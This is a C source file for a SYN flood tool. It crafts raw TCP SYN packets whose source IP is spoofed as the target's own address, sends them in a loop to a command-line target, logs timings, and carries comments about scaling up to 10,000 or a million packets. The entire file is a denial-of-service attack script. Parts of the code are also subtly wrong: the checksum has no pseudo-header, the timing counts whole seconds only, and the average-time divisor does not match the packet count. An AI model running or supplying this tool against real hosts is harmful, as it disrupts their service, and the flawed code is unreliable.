#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/time.h>

unsigned short csum(unsigned short *ptr, int nbytes);

int main(int argc, char *argv[])
{
    if (argc != 3) {
        printf("Usage: synflood_c [target_ip] [target_port]\n");
        exit(1);
    }

    char *target_ip = argv[1];
    int target_port = atoi(argv[2]);

    // Create a raw socket
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0) {
        perror("socket()");
        exit(1);
    }

    // Set IP_HDRINCL to 1 to enable custom IP header
    int one = 1;
    const int *val = &one;
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0) {
        perror("setsockopt()");
        exit(1);
    }

    // Set up the target address structure
    struct sockaddr_in target_addr;
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(target_port);
    inet_pton(AF_INET, target_ip, &(target_addr.sin_addr));

    // Set up the IP header
    char packet[4096];
    struct iphdr *ip_header = (struct iphdr *) packet;
    ip_header->ihl = 5;
    ip_header->version = 4;
    ip_header->tos = 0;
    ip_header->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
    ip_header->id = htons(54321);
    ip_header->frag_off = 0;
    ip_header->ttl = 255;
    ip_header->protocol = IPPROTO_TCP;
    ip_header->check = 0;
    ip_header->saddr = inet_addr(target_ip);
    ip_header->daddr = target_addr.sin_addr.s_addr;

    // Set up the TCP header
    struct tcphdr *tcp_header = (struct tcphdr *) (packet + sizeof(struct iphdr));
    tcp_header->source = htons(1234);
    tcp_header->dest = htons(target_port);
    tcp_header->seq = 0;
    tcp_header->ack_seq = 0;
    tcp_header->doff = 5;
    tcp_header->fin = 0;
    tcp_header->syn = 1;
    tcp_header->rst = 0;
    tcp_header->psh = 0;
    tcp_header->ack = 0;
    tcp_header->urg = 0;
    tcp_header->window = htons(5840);
    tcp_header->check = 0;
    tcp_header->urg_ptr = 0;

    // Calculate the TCP checksum
    tcp_header->check = csum((unsigned short *) (packet + sizeof(struct iphdr)), sizeof(struct tcphdr));
    
    // open file for writing
    FILE *f = fopen("syns_results_c.txt", "w");
    if (f == NULL) {
        printf("Error opening file!\n");
        exit(1);
    }

    // Send the SYN packets in a loop %% moment of truth need to change to j< 10K
    int i, j;
    struct timeval start_total, end_total;
    struct timeval start, end;
    gettimeofday(&start_total, NULL);
    
    for (i = 0; i < 100; i++) {
        for (j = 0; j < 10; j++) {
            gettimeofday(&start, NULL);
            if (sendto(sock, packet, sizeof(struct iphdr) + sizeof(struct tcphdr), 0, (struct sockaddr *) &target_addr, sizeof(target_addr)) < 0) {
                perror("sendto()");
                exit(1);
            }
            gettimeofday(&end, NULL);
            // write packet index and time to file
            fprintf(f, "%d\t%f\n", i, (end.tv_sec - start.tv_sec));
        }
        //usleep(1000); // Wait for 1ms before sending %% delete?
    }
    gettimeofday(&end_total, NULL);
    double total_time = (double)end_total.tv_sec - start_total.tv_sec;
    // calculate average time to send a packet %%change to 1m
    double avg_time = total_time / 1000000;
    // append average time to file
    fprintf(f, "Total time: %f\nAverage time per packet: %f", total_time, avg_time);
    // close file
    fclose(f);
    
}

unsigned short csum(unsigned short *ptr, int nbytes)
{
    register long sum;
    unsigned short oddbyte;
    register short answer;

    sum = 0;
    while (nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }
    if (nbytes == 1) {
        oddbyte = 0;
        *((unsigned char *) &oddbyte) = *(unsigned char *)ptr;
        sum += oddbyte;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    answer = (short)~sum;

    return answer;
}
